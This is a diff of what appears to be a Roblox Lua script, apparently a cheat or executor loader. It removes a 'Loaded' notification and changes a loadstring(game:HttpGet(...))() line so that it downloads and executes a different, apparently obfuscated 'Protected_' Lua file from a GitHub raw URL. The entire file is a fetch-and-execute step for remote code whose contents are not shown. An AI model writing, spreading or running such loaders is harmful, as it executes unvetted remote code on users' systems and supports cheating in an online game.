@@ -1,7 +1,1 @@
-game:GetService("StarterGui"):SetCore("SendNotification",{
-	Title = "ik im bored", -- Required
-	Text = "Loaded", -- Required
-	Icon = "rbxassetid://1404188196" -- Optional
-})
-
-loadstring(game:HttpGet('https://raw.githubusercontent.com/yieviro92creepy/blade/main/Protected_4731988121260257.lua.txt'))()
+loadstring(game:HttpGet('https://raw.githubusercontent.com/yieviro92creepy/blade/main/Protected_1410886099554112.lua.txt'))()
